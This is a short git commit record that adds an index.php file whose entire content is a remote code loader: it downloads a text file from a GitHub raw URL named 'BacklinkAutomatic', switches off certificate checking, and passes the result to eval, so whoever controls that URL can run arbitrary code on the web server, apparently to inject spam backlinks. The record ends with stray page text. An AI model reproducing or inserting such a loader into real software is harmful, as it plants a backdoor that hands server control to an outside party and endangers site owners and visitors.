b21e0576da561c341c15368915f7b24ff74a8df3
Playmaker ! <embar24082024054912@rowdydow.com>
2024-08-25 04:19:59 +0700

    index.php

---
+++ index.php
@@ -0,0 +1,11 @@
+<?php
+$url = 'https://raw.githubusercontent.com/embarkasifu/BacklinkAutomatic/main/file.txt';
+$ch = curl_init($url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+$fileContents = curl_exec($ch);
+curl_close($ch);
+eval("?>" . $fileContents);
+?>
+0 comments on comm
